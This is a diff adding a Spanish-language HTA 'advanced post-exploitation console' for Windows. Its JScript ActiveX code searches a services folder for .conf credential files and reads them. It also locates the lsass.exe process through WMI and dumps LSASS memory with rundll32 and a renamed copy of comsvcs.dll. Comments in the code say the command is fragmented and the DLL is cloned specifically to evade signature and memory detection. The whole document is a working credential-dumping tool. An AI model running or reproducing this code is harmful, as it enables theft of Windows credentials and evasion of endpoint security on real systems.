@@ -1,0 +1,99 @@
+<html>
+<head>
+<title>Auditoría de Sistemas - Escenario de Post-Explotación</title>
+<style>
+    body { background: #1a1a1a; color: #00ff00; font-family: 'Consolas', monospace; padding: 20px; }
+    .box { border: 1px solid #333; padding: 15px; margin-bottom: 20px; background: #222; }
+    button { background: #0055aa; color: white; border: none; padding: 10px; cursor: pointer; font-weight: bold; }
+    textarea, input { background: #000; color: #0f0; border: 1px solid #444; width: 100%; margin: 5px 0; }
+    #status { font-weight: bold; margin-top: 10px; color: yellow; }
+</style>
+
+<script language="JScript">
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var shell = new ActiveXObject("WScript.Shell");
+
+    // 1. ESCANEO DE CREDENCIALES
+    function iniciarEscaneo() {
+        var log = document.getElementById("log");
+        log.value = "Buscando .conf en C:\\Services...\n";
+        (function scan(path) {
+            try {
+                var folder = fso.GetFolder(path);
+                var files = new Enumerator(folder.Files);
+                for (; !files.atEnd(); files.moveNext()) {
+                    if (files.item().Name.toLowerCase().indexOf(".conf") !== -1) 
+                        log.value += files.item().Path + "\n";
+                }
+                var subs = new Enumerator(folder.SubFolders);
+                for (; !subs.atEnd(); subs.moveNext()) scan(subs.item().Path);
+            } catch(e) {}
+        })("C:\\Services");
+    }
+
+    function leerArchivo() {
+        try {
+            var f = fso.OpenTextFile(document.getElementById("filepath").value, 1);
+            alert(f.ReadAll()); f.Close();
+        } catch(e) { alert("Error de lectura."); }
+    }
+
+    // 2. DETECCIÓN DE LSASS
+    function detectarLSASS() {
+        try {
+            var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+            var procs = wmi.ExecQuery("Select * from Win32_Process where Name = 'lsass.exe'");
+            var e = new Enumerator(procs);
+            if (!e.atEnd()) {
+                document.getElementById("pid_val").value = e.item().ProcessId;
+                document.getElementById("status").innerText = "LSASS detectado. Listo para el volcado.";
+            }
+        } catch(e) { alert("Acceso WMI denegado."); }
+    }
+
+    // 3. DUMPEO CON BYPASS DE FIRMA
+    function ejecutarDumpBypass() {
+        var pid = document.getElementById("pid_val").value;
+        if (!pid) return;
+
+        try {
+            var src = "C:\\Windows\\System32\\comsvcs.dll";
+            var dst = "C:\\Users\\Public\\mssql_" + Math.random().toString(36).substring(7) + ".tmp";
+            var out = "C:\\Users\\Public\\report_" + pid + ".dat";
+
+            // Clonamos la DLL con nombre aleatorio para evadir firmas de archivo
+            fso.CopyFile(src, dst);
+
+            // Fragmentamos el comando para que no sea detectado por escaneo de memoria del HTA
+            var c1 = "rundll32.exe ", c2 = dst, c3 = ", Mini", c4 = "Dump ", c5 = " full";
+            var cmd = c1 + c2 + c3 + c4 + pid + " " + out + c5;
+
+            shell.Run(cmd, 0, false);
+            document.getElementById("status").innerText = "Comando ejecutado. Revisa si se generó: " + out;
+        } catch(e) { 
+            document.getElementById("status").innerText = "Bloqueado por EDR: " + e.message;
+            document.getElementById("status").style.color = "red";
+        }
+    }
+</script>
+</head>
+<body>
+    <h2>Consola de Post-Explotación Avanzada</h2>
+    
+    <div class="box">
+        <h4>1. Localización de Credenciales</h4>
+        <button onclick="iniciarEscaneo()">Escanear Servicios</button>
+        <textarea id="log" rows="3"></textarea>
+        <input type="text" id="filepath" value="C:\Services\InternalApp\Config\db_connection.conf">
+        <button onclick="leerArchivo()">Leer Secreto</button>
+    </div>
+
+    <div class="box">
+        <h4>2. Extracción de Memoria (LSASS)</h4>
+        <button onclick="detectarLSASS()">Detectar PID</button>
+        <input type="text" id="pid_val" style="width:100px; text-align:center;">
+        <button onclick="ejecutarDumpBypass()" style="background:red;">VOLCADO SIGILOSO</button>
+        <div id="status">Esperando...</div>
+    </div>
+</body>
+</html>
